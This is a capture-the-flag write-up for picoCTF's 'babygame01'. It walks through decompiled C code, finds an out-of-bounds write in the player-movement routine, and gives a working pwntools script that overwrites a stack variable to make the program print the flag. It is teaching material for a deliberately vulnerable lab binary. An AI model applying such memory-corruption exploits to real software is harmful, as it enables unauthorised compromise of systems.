### babygame01

Download the game and open it in a decompiler.

Starting from `main()`:

```c
undefined4 main(void)

{
  int iVar1;
  undefined4 uVar2;
  int in_GS_OFFSET;
  int local_aac;
  int local_aa8;
  char target;
  undefined local_aa0 [2700];
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  init_player(&local_aac);
  init_map(local_aa0,&local_aac);
  print_map(local_aa0,&local_aac);
  signal(2,sigint_handler);
  do {
    do {
      iVar1 = getchar();
      move_player(&local_aac,(int)(char)iVar1,local_aa0);
      print_map(local_aa0,&local_aac);
    } while (local_aac != 0x1d);
  } while (local_aa8 != 0x59);
  puts("You win!");
  if (target != '\0') {
    puts("flage");
    win();
    fflush(stdout);
  }
  uVar2 = 0;
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar2 = __stack_chk_fail_local();
  }
  return uVar2;
}
```

We see that it calls `win()` if a condition is met.

```c
void win(void)

{
  FILE *__stream;
  int in_GS_OFFSET;
  char local_4c [60];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("flag.txt not found in current directory");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_4c,0x3c,__stream);
  printf(local_4c);
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
```

This functions prints the flag so this is our goal. We need to make the `target` value `!= '\0'`. We can see that the `target` value is located before the buffer that we have write access.

```c
char target;
undefined local_aa0 [2700];
```

If we manage to write `out-of-bounds`, we can overwrite its value with something and print the flag.

We can alter its value in these 2 functions:

```c
  iVar1 = getchar();
  move_player(&local_aac,(int)(char)iVar1,local_aa0);
  print_map(local_aa0,&local_aac);
```

Let's analyze them.

`move_player()`:

```c
void move_player(int *param_1,char param_2,int param_3)

{
  int iVar1;
  
  if (param_2 == 'l') {
    iVar1 = getchar();
    player_tile = (undefined)iVar1;
  }
  if (param_2 == 'p') {
    solve_round(param_3,param_1);
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = 0x2e;
  if (param_2 == 'w') {
    *param_1 = *param_1 + -1;
  }
  else if (param_2 == 's') {
    *param_1 = *param_1 + 1;
  }
  else if (param_2 == 'a') {
    param_1[1] = param_1[1] + -1;
  }
  else if (param_2 == 'd') {
    param_1[1] = param_1[1] + 1;
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = player_tile;
  return;
}
```

We can see that:

* `w` -> moves up
* `a` -> moves left
* `s` -> moves down
* `d` -> moves right
* `p` -> solves the round
* `l` -> write to `player_tile`

The game's interface is really helpful.

```bash
Player position: 4 4
End tile position: 29 89
Player has flag: 0
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
....@.....................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```

There is this `Player has flag` string that indicates we have overwritten the `target` value, thus we can get the flag.

Our exploitation process is to:

* Dynamically read the player's position (it's not needed cause it's static but I like doing things dynamically)
* Move the player to the start of the array.
* Move it left till the target is overwritten and `Player has flag` value changes.

```python
from pwn import *
context.log_level = 'critical'

r = remote('saturn.picoctf.net', 61701)

r.recvuntil(b'Player position: ')
pos = r.recvline().strip().split(b' ')

# Go up
[r.sendline(b'w') for i in range(int(pos[0]))]

# Go left
[r.sendline(b'a') for i in range(int(pos[0]))]

r.recvuntil(b'Player position: 0 0')

while (1):
  r.recvuntil(b'Player has flag: ')
  player_has_flag = r.recvline().strip()
  r.recvuntil(b'X')
  if player_has_flag != b'0':
    r.sendline(b'p')
    r.recvuntil(b'flage\r\n')
    print(f'\nFlag --> {r.recvuntil(b"}").decode()}\n')
    exit()
  r.sendline(b'a')
  # Map is bugged
  r.recv(0x5ac)
```

```bash
➜  babygame01 git:(main) ✗ python solver.py

Flag --> picoCTF{XXX}
```